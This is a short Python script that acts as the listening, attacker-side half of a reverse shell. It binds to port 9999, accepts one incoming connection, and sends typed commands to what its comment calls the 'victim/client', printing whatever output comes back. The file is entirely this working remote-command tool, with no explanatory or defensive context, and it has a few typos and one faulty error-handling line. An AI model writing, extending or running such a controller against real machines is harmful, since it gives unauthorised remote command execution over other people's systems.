from re import S
import socket #this  moudle is use to connect to system
import sys #this module use to command of terminal

#function to connect socket
def create_socket():
    try:
        global host
        global port
        global s
        # host = input('Enter your static ip address')
        host = ""
        port = 9999

        s = socket.socket()
    except socket.error as msg:
        print('Somthing went wrong'+ str(msg))

# bindding the socket and listing the connetion

def bind_socket():
    try:
        global host
        global port
        global s

        print('Binding the port..\t' + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print('Somthing went wrong'+ str(msg)) + '\n' + 'Retrying....'
        bind_socket()

# accepting the connection
def socket_accept():
    conn,address = s.accept()
    print('Contection has been established...'+'ip'+address[0]+': port : ' + str(address[1]))
    send_command(conn)
    conn.close()

# send command to victim/client
def send_command(conn):
    while True:
        cmd = input()
        if 'quit' in cmd:
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_responese = str(conn.recv(1024),"UTF-8")
            print(client_responese, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()